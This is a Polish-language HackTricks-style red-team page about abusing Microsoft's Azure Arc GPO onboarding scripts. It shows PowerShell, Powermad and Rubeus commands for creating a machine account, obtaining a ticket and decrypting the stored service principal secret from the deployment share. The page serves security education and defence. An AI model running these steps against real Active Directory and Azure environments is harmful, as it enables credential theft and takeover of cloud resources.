# Az - Wra偶liwy skrypt wdra偶ania GPO Azure Arc

{% hint style="success" %}
Dowiedz si i wicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz si i wicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}

### Identyfikacja problem贸w

Azure Arc umo偶liwia integracj nowych serwer贸w wewntrznych (serwery doczone do domeny) do Azure Arc za pomoc metody Group Policy Object. W tym celu Microsoft udostpnia zestaw narzdzi do wdra偶ania niezbdny do rozpoczcia procedury doczania. Wewntrz pliku ArcEnableServerGroupPolicy.zip znajduj si nastpujce skrypty: DeployGPO.ps1, EnableAzureArc.ps1 i AzureArcDeployment.psm1.

Podczas wykonywania skryptu DeployGPO.ps1 nastpujce czynnoci s wykonywane:

1. Tworzy GPO do doczania serwer贸w Azure Arc w lokalnej domenie.
2. Kopiuje skrypt doczania EnableAzureArc.ps1 na okrelon udostpnion sie stworzon dla procesu doczania, kt贸ra zawiera r贸wnie偶 pakiet instalacyjny systemu Windows.

Podczas uruchamiania tego skryptu administratorzy systemu musz poda dwie g贸wne parametry: **ServicePrincipalId** i **ServicePrincipalClientSecret**. Dodatkowo wymagane s inne parametry, takie jak domena, FQDN serwera hostujcego udzia, nazwa udziau. Dodatkowe szczeg贸y, takie jak identyfikator najemcy, grupa zasob贸w i inne niezbdne informacje, musz r贸wnie偶 zosta podane skryptowi.

Za pomoc szyfrowania DPAPI-NG w katalogu AzureArcDeploy na okrelonym udziale generowany jest zaszyfrowany sekret. Zaszyfrowany sekret jest przechowywany w pliku o nazwie encryptedServicePrincipalSecret. Dowody na to mo偶na znale藕 w skrypcie DeployGPO.ps1, gdzie szyfrowanie jest wykonywane poprzez wywoanie ProtectBase64 z $descriptor i $ServicePrincipalSecret jako dane wejciowe. Deskryptor skada si z SID grup Domain Computer i Domain Controller, zapewniajc, 偶e ServicePrincipalSecret mo偶e by odszyfrowany tylko przez grupy zabezpiecze Domain Controllers i Domain Computers, jak zaznaczono w komentarzach skryptu.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Wykorzystanie

Mamy nastpujce warunki:

1. Udao nam si przebi do wewntrznej sieci.
2. Mamy mo偶liwo utworzenia lub przejcia konta komputera w ramach Active Directory.
3. Odkrylimy udzia sieciowy zawierajcy katalog AzureArcDeploy.

Istnieje kilka metod pozyskania konta komputera w rodowisku AD. Jedn z najczstszych jest wykorzystanie limitu konta komputerowego. Inn metod jest skompromitowanie konta komputerowego poprzez podatne ACL lub r贸偶ne inne bdy konfiguracyjne.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Po uzyskaniu konta maszyny mo偶liwe jest uwierzytelnienie przy u偶yciu tego konta. Mo偶emy u偶y polecenia runas.exe z flag netonly lub skorzysta z opcji pass-the-ticket za pomoc Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Poprzez przechowywanie TGT dla naszego konta komputerowego w pamici, mo偶emy u偶y poni偶szego skryptu do odszyfrowania tajnego klucza g贸wnego usugi.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternatywnie, mo偶emy u偶y [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

W tym momencie mo偶emy zebra pozostae informacje potrzebne do poczenia z Azure z pliku ArcInfo.json, kt贸ry jest przechowywany na tym samym udostpnionym zasobie sieciowym co plik encryptedServicePrincipalSecret. Ten plik zawiera szczeg贸y takie jak: TenantId, servicePrincipalClientId, ResourceGroup i inne. Z tymi informacjami mo偶emy u偶y Azure CLI do uwierzytelnienia jako skompromitowany podmiot usugi.

## Referencje

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Azure-Arc/)
